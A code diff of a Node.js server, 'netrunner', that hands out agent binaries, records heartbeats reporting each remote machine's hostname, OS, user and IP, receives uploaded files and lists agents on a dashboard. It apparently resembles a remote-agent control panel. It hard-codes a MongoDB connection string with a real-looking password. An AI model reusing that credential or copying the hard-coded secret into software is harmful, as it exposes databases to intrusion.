@@ -14,6 +14,7 @@ import { Upload } from '@aws-sdk/lib-storage';
 const PORT = process.env.PORT || 8080;
 const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://ffasito:Reputo11.@rybjuani.ewuurhu.mongodb.net/?appName=rybjuani";
 const UPLOAD_DIR = path.join(os.tmpdir(), 'netrunner-uploads');
+const DEFAULT_OS = process.env.DEFAULT_AGENT_OS || 'linux';
 
 // --- B2 CONFIGURATION ---
 const B2_ENDPOINT = process.env.B2_ENDPOINT;
@@ -43,14 +44,14 @@ const app = express();
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 const mongoClient = new MongoClient(MONGO_URI);
-let logCollection;
+let agentReportsCollection;
 let filesCollection;
 
 async function connectMongo() {
     try {
         await mongoClient.connect();
         const db = mongoClient.db("netrunner_logs");
-        logCollection = db.collection("sync_server_logs");
+        agentReportsCollection = db.collection("sync_server_logs");
         filesCollection = db.collection("received_files");
         console.log("💾 MongoDB Conectado.");
     } catch (e) {
@@ -77,12 +78,18 @@ app.get('/api/download/agent', async (req, res) => {
         agentKey = process.env.AGENT_LINX_KEY;
         agentFilename = 'netrunner_agent';
     } else {
-        agentKey = process.env.AGENT_WIN_KEY;
-        agentFilename = 'netrunner_agent.exe';
+        // Fallback configurable (default: Linux)
+        if (DEFAULT_OS === 'windows') {
+            agentKey = process.env.AGENT_WIN_KEY;
+            agentFilename = 'netrunner_agent.exe';
+        } else {
+            agentKey = process.env.AGENT_LINX_KEY;
+            agentFilename = 'netrunner_agent';
+        }
     }
     
     console.log(`📥 User-Agent: ${userAgent}`);
-    console.log(`📥 SO detectado: ${isWindows ? 'Windows' : isLinux ? 'Linux' : 'Default (Windows)'}`);
+    console.log(`📥 SO detectado: ${isWindows ? 'Windows' : isLinux ? 'Linux' : `Default (${DEFAULT_OS})`}`);
     console.log(`📥 Key a buscar: ${agentKey}`);
     
     // Si está configurado B2, usar como proxy
@@ -148,11 +155,84 @@ app.get('/dashboard', (req, res) => {
 });
 
 app.get('/api/dashboard-data', async (req, res) => {
-    const agents = Array.from(wss.clients).map(ws => ({
+    let latestAgentReports = [];
+    if (agentReportsCollection) {
+        latestAgentReports = await agentReportsCollection.aggregate([
+            { $sort: { timestamp: -1 } },
+            {
+                $group: {
+                    _id: "$agentId",
+                    hostname: { $first: "$hostname" },
+                    os: { $first: "$os" },
+                    user: { $first: "$user" },
+                    ip: { $first: "$ip" },
+                    lastSeen: { $first: "$timestamp" }
+                }
+            },
+            {
+                $project: {
+                    _id: 0,
+                    agentId: "$_id",
+                    hostname: 1,
+                    os: 1,
+                    user: 1,
+                    ip: 1,
+                    lastSeen: 1
+                }
+            }
+        ]).toArray();
+    }
+    
+    // Mapear los últimos reportes por agentId
+    const latestReportsMap = new Map(latestAgentReports.map(report => [report.agentId, report]));
+    
+    // Combinar con conexiones WebSocket activas
+    const wsAgents = Array.from(wss.clients).map(ws => ({
         id: ws.id,
+        agentId: ws.agentId,
         ip: ws.ip,
-        lastSeen: ws.lastSeen
+        lastSeen: ws.lastSeen,
+        isOnline: true
     }));
+    
+    // Map para combinar datos
+    const agentsMap = new Map();
+    
+    // Agregar agentes WebSocket activos
+    wsAgents.forEach(wsAgent => {
+        const agentId = wsAgent.agentId || wsAgent.id;
+        const report = latestReportsMap.get(agentId);
+        
+        agentsMap.set(agentId, {
+            id: agentId,
+            hostname: report?.hostname || 'Desconocido',
+            ip: wsAgent.ip || report?.ip || 'N/A',
+            os: report?.os || 'Unknown',
+            user: report?.user || 'N/A',
+            lastSeen: wsAgent.lastSeen,
+            isOnline: true,
+            source: 'websocket'
+        });
+    });
+    
+    // Agregar agentes solo en MongoDB (offline)
+    latestAgentReports.forEach(report => {
+        if (!agentsMap.has(report.agentId)) {
+            agentsMap.set(report.agentId, {
+                id: report.agentId,
+                hostname: report.hostname || 'Desconocido',
+                ip: report.ip || 'N/A',
+                os: report.os || 'Unknown',
+                user: report.user || 'N/A',
+                lastSeen: report.lastSeen,
+                isOnline: false,
+                source: 'report'
+            });
+        }
+    });
+    
+    const agents = Array.from(agentsMap.values());
+    
     const files = await filesCollection.find().sort({ timestamp: -1 }).limit(50).toArray();
     res.json({ agents, files });
 });
@@ -179,6 +259,7 @@ wss.on('connection', (ws, req) => {
     ws.ip = req.socket.remoteAddress;
     ws.lastSeen = Date.now();
     ws.isAlive = true;
+    ws.agentId = null;
 
     logToMongo('info', 'Agente conectado', { agentId: ws.id, clientIp: ws.ip });
 
@@ -193,10 +274,24 @@ wss.on('connection', (ws, req) => {
         try {
             const data = JSON.parse(message.toString());
             
+            if (data.agentId) {
+                ws.agentId = data.agentId;
+            }
+            
             if (data.type === 'file_chunk') {
                 handleFileChunkMetadata(ws, data);
             } else if (data.type === 'heartbeat') {
                 ws.isAlive = true;
+                ws.lastSeen = Date.now();
+                // Actualizar o insertar el estado del agente en MongoDB
+                logToMongo('heartbeat', 'Agente reportando', {
+                    agentId: data.agentId || ws.agentId,
+                    hostname: data.hostname,
+                    os: data.os,
+                    user: data.user,
+                    ip: ws.ip, // Usar la IP capturada en la conexión
+                    timestamp: new Date()
+                });
             }
         } catch (e) {
             console.error("Error parseando mensaje:", e);
@@ -392,8 +487,8 @@ setInterval(async () => {
 wss.on('close', () => clearInterval(heartbeatInterval));
 
 function logToMongo(level, message, metadata = {}) {
-    if (logCollection) {
-        logCollection.insertOne({
+    if (agentReportsCollection) {
+        agentReportsCollection.insertOne({
             level,
             message,
             timestamp: new Date(),
